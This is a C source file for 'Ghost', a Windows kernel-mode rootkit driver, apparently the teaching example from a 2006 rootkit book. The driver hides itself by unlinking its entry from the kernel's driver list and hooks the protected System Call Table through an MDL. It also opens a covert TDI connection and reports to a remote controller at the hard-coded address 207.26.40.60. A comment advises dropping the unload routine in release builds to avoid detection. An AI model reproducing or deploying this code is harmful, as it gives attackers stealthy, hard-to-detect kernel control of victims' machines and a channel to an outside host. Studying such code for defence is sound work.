// Ghost
// Copyright Ric Vieler, 2006

#include "ntddk.h"
#include "Ghost.h"
#include "fileManager.h"
#include "configManager.h"
#include "hookManager.h"
#include "IoManager.h"
#include "commManager.h"

// Global version data
ULONG majorVersion;
ULONG minorVersion;

// Global base address
PVOID kernel32Base = NULL;

// Global state data
BOOL allowEncryption = TRUE;

// Used to circumvent memory protected System Call Table
PVOID* NewSystemCallTable = NULL;
PMDL pMyMDL = NULL;

// Pointer(s) to original function(s) - before hooking
ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
ZWPROTECTVIRTUALMEMORY OldZwProtectVirtualMemory;

VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
    UNICODE_STRING deviceLink = { 0 };

	// Close the connection to remote controller
	CloseTDIConnection();

	// remove device controller
    RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
    IoDeleteSymbolicLink( &deviceLink );
	IoDeleteDevice( pDriverObject->DeviceObject );
	DbgPrint("comint32: Device controller removed.");

	// Unhook any hooked functions and return the Memory Descriptor List
	if( NewSystemCallTable )
	{
		UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
		MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
		IoFreeMdl( pMyMDL );
	}
	DbgPrint("comint32: Hooks removed.");
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	DRIVER_DATA* driverData;
    UNICODE_STRING deviceName = { 0 };
    UNICODE_STRING deviceLink = { 0 };
	PDEVICE_OBJECT pDeviceController;

	// Get the operating system version
	PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );

	// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
	// Major = 5: Windows Server 2003, Windows XP or Windows 2000
	// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
	// Minor = 1: Windows XP
	// Minor = 2: Windows Server 2003

	if ( majorVersion == 5 && minorVersion == 2 )
	{
		DbgPrint("comint32: Running on Windows 2003");
	}
	else if ( majorVersion == 5 && minorVersion == 1 )
	{
		DbgPrint("comint32: Running on Windows XP");
	}
	else if ( majorVersion == 5 && minorVersion == 0 )
	{
		DbgPrint("comint32: Running on Windows 2000");
	}
	else if ( majorVersion == 4 && minorVersion == 0 )
	{
		DbgPrint("comint32: Running on Windows NT 4.0");
	}
	else
	{
		DbgPrint("comint32: Running on unknown system");
	}

	// Hide this driver
	driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
	if( driverData != NULL )
	{
		// unlink this driver entry from the driver list
		*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
		driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
	}

	// Get the remote controller's address and port
	if( !NT_SUCCESS( Configure() ) )
	{
		DbgPrint("comint32: Configure failed!\n");		
		return STATUS_UNSUCCESSFUL;
	}

	// Add kernel hooks
	if( !NT_SUCCESS( HookKernel() ) )
	{
		DbgPrint("comint32: HookKernel failed!\n");		
		return STATUS_UNSUCCESSFUL;
	}

	// Open the connection to remote controller
	if( !NT_SUCCESS( OpenTDIConnection() ) )
	{
		DbgPrint("comint32: Could not open remote connection.\n");		
		return STATUS_UNSUCCESSFUL;
	}

	// Tell remote controller that we're here
	SendToRemoteController( "207.26.40.60" );

	// Create the device controller
	RtlInitUnicodeString( &deviceName, GHOST_DEVICE_CREATE_NAME );
	IoCreateDevice( pDriverObject,
		 0,
		 &deviceName,
		 FILE_DEVICE_UNKNOWN,
		 0,
		 FALSE,
		 &pDeviceController );
    RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
    IoCreateSymbolicLink( &deviceLink, &deviceName );

	pDriverObject->MajorFunction[IRP_MJ_CREATE]	        =
	pDriverObject->MajorFunction[IRP_MJ_CLOSE]	        =
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = OnDispatch;

	// Comment out in free build to avoid detection
	pDriverObject->DriverUnload = OnUnload; 

	return STATUS_SUCCESS;
}
